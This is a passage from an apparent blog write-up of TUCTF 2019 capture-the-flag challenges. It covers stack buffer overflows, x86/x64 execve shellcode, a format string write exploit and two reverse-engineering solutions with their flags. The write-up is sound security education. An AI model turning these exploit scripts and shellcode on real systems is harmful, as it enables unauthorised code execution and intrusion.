&lt;p&gt;Also inspecting the functions, we see that there is a &lt;code&gt;printFlag&lt;/code&gt; function at 0x80491f6. So, our objective is to jump there.&lt;/p&gt;
&lt;p&gt;The following script is the exploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./thefirst&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# p = remote(&amp;#34;chal.tuctf.com&amp;#34;, 30508)&lt;/span&gt;
print_flag_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80491f6&lt;/span&gt;
offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BBBB&amp;#34;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(print_flag_addr)

f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;shellme32---462-pts&#34;&gt;shellme32 - 462 pts&lt;/h2&gt;
&lt;p&gt;On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using &lt;code&gt;vmmap&lt;/code&gt;, we find that the adress given to us is that of the stack and the stack is read, write and executable.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/shellme32_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/shellme32_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;We use &lt;a href=&#34;http://shell-storm.org/shellcode/files/shellcode-811.php&#34;&gt;shell-storm&lt;/a&gt; to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with &amp;lsquo;A&amp;rsquo;s and then provide the address to write to, i.e. the adress provided to us.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./shellme32&amp;#34;&lt;/span&gt;)

offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;


p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;)

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Stack Address: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(hex(addr)))

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shellcode
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; len_shell_code)

payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(len(shellcode))
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;shellme64---480-pts&#34;&gt;shellme64 - 480 pts&lt;/h2&gt;
&lt;p&gt;This is similar to the shellme32 challenge. We just replace the shellcode with a x64 shellcode. And  replace &lt;code&gt;p32&lt;/code&gt; with &lt;code&gt;p64&lt;/code&gt; when adding the stack address to the payload.&lt;/p&gt;
&lt;p&gt;We use &lt;a href=&#34;https://www.exploit-db.com/exploits/42179&#34;&gt;exploit-db&lt;/a&gt; to get the shellcode. The offset of the crash is same as before.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./shellme64&amp;#34;&lt;/span&gt;)

offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;


p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;this&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;)

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Stack Address: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(hex(addr)))

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shellcode
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; len(shellcode))

&lt;span style=&#34;color:#75715e&#34;&gt;# with open(&amp;#39;payload&amp;#39;, &amp;#39;wb&amp;#39;) as f:&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#     f.write(payload)&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(addr)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;printfun---500-pts&#34;&gt;printfun - 500 pts&lt;/h2&gt;
&lt;p&gt;Here, on analysing with Ghidra, we find that there is a format string vulnerability.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/printfun_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/printfun_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;So, here first we use GDB to get the addresses of the two buffers being compared. Also, as input if we provide &lt;code&gt;&amp;quot;%x %x %x %x %x %x %x %x %x %x %x %x %x %x&amp;quot;&lt;/code&gt;, for the instance running on GDB we get this output -&lt;/p&gt;
&lt;p&gt;&lt;code&gt;5655a050 3c 14 1 ffffc994 5655a050 5655a008 ffffc900 0 0 f7e06637 f7fa0000 f7fa0000 0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;On seeing the values displayed by GDB, we see two addresses - &lt;code&gt;0x5655a008&lt;/code&gt; and &lt;code&gt;0x5655a050&lt;/code&gt;&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/printfun_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/printfun_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;This is intereting as both these addresses are also present in the program&amp;rsquo;s output with our input.&lt;/p&gt;
&lt;p&gt;So, all we have to do is overwrite the 6th and 7th &amp;ldquo;addresses&amp;rdquo; of the output to the same value so that the string comparison passes.&lt;/p&gt;
&lt;p&gt;We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now :frowning_face:) -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;printfun&amp;#34;&lt;/span&gt;)

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AAAA%6$n%7$n&amp;#34;&lt;/span&gt;

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;? &amp;#39;&lt;/span&gt;, payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id=&#34;rev-challenges&#34;&gt;Rev Challenges&lt;/h1&gt;
&lt;h2 id=&#34;faker---400-pts&#34;&gt;faker - 400 pts&lt;/h2&gt;
&lt;p&gt;If we open the binary in Ghidra, we see that there are calls to different functions, namely &lt;em&gt;A&lt;/em&gt;, &lt;em&gt;B&lt;/em&gt; and &lt;em&gt;C&lt;/em&gt;, which depend on the user input. But on trying them, we get fake flags.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;But all of them have a common structure, they have a call to &lt;code&gt;printFlag&lt;/code&gt; with a string.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Also in the functions list, we see that there is a function named &lt;code&gt;thisone&lt;/code&gt;. First we take a look at &lt;code&gt;printFlag&lt;/code&gt; function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/faker_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;There can be two ways to solve this challenge.&lt;/p&gt;
&lt;h3 id=&#34;method-1---static&#34;&gt;Method 1 - Static&lt;/h3&gt;
&lt;p&gt;Write a script to emulate the functionality of the &lt;code&gt;printFlag&lt;/code&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;printFlag&lt;/span&gt;(s):
    s2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(s)):
        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((((ord(s[i]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1d&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5f&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;
        s2 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(x)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(s2)

printFlag(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PJ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives us the flag - &lt;code&gt;TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;method-2---dynamic&#34;&gt;Method 2 - Dynamic&lt;/h3&gt;
&lt;p&gt;Here set a breakpoint in main and then run the following commads in GDB.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; info functions  &lt;span style=&#34;color:#75715e&#34;&gt;# get address of printFlag function&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; set $rip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x000055555555534b   &lt;span style=&#34;color:#75715e&#34;&gt;# i.e. to the address of the function&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will print the flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;core---400-pts&#34;&gt;core - 400 pts&lt;/h2&gt;
&lt;p&gt;We a re provided a core dump and a C file. The C file looks like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  // prints&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt; // malloc&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt; // strcmp&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt; // read&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;  // open&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt; // close&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;time.h&amp;gt;   // time&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define FLAG_LEN 64
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; flag[FLAG_LEN];

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;str, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len) {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
		str[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
	}
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    setvbuf(stdout, NULL, _IONBF, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;);
    setvbuf(stdin, NULL, _IONBF, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;);

	&lt;span style=&#34;color:#75715e&#34;&gt;// Read the flag
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	memset(flag, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, FLAG_LEN);
	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;);
	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, flag, FLAG_LEN);

	xor(flag, len);

	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
	read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Basically we are XORing the input string with 1. We assume that flag is in the standard format, i.e. begins with &lt;code&gt;TUCTF&lt;/code&gt;. So we pre-calculate, the starting of the string that should be in memory.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TUCTF&lt;/code&gt; =&amp;gt; &lt;code&gt;UTBUG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We use &lt;code&gt;xxd&lt;/code&gt; to view the core.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/core.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/core.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;We find something interesting in the memory. On decoding&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;core_string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;55544255477a623173325e65746c713e5e4f327732735e69323573655e31675e7831747c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;)

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; core_string:
    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ord(i) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag - &lt;code&gt;TUCTF{c0r3_dump?_N3v3r_h34rd_0f_y0u}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;That&amp;rsquo;s all for now :wave:.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>RITSEC CTF 2019</title>
      <link>https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/</link>
